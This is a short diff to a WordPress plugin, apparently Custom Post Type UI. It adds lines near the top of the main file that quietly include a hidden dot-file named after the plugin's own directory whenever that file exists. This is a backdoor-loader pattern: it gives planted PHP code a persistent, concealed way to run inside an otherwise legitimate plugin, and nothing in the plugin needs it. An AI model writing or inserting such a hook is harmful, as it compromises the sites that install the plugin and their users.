@@ -41,6 +41,10 @@ define( 'CPTUI_WP_VERSION', get_bloginfo( 'version' ) );
  *
  * @internal
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function cptui_load_ui_class() {
 	require_once plugin_dir_path( __FILE__ ) . 'classes/class.cptui_admin_ui.php';
 	require_once plugin_dir_path( __FILE__ ) . 'classes/class.cptui_debug_info.php';
